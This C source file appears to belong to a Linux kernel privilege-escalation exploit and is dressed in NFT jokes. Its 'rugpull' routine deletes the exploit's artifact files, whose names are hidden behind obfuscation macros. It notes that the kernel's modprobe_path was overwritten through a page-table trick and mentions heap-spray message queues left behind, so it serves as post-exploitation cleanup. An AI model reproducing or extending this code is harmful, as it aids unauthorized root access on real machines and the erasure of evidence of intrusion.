#include "nfttables.h"
#include "obf.h"

int rugpull(void)
{
    pr_info("");
    pr_info(RUG " " C_BOLD "The devs are leaving the project..." C_RST);
    pr_info("");

    int cleaned = 0;

    /* remove exploit artifacts */
    const char *artifacts[] = {
        S(S_NFT_MINT),
        S(S_NFT_SH),
        S(S_NFT_TRIGGER),
        NULL,
    };

    for (const char **p = artifacts; *p; p++) {
        if (unlink(*p) == 0) {
            pr_info(BROOM " Burned: %s", *p);
            cleaned++;
        }
    }

    /* try to restore modprobe_path if we have access */
    uint64_t modprobe_addr = kallsyms_lookup(S(S_MODPROBE_PATH));
    if (modprobe_addr && geteuid() == 0) {
        /* can't easily restore without the same PTE trick.
           log it as a known artifact. */
        pr_warn("%s was overwritten in kernel memory", S(S_MODPROBE_PATH));
        pr_info("  " C_DIM "restore: echo %s > %s" C_RST,
                S(S_SBIN_MODPROBE), S(S_PROC_MODPROBE));
    }

    /* clear any message queues we left behind */
    pr_info(BROOM " Clearing IPC message queues...");
    /* we can't know our exact queue IDs post-exploit, so this is
       best-effort. the queues are cleaned up on process exit anyway. */

    if (cleaned == 0)
        pr_info(C_DIM "  (nothing to clean)" C_RST);

    pr_info("");
    pr_info(CHART " " C_DIM "%s: 0" C_RST, S(S_LBL_FLOOR_PRICE));
    pr_info("");

    return 0;
}
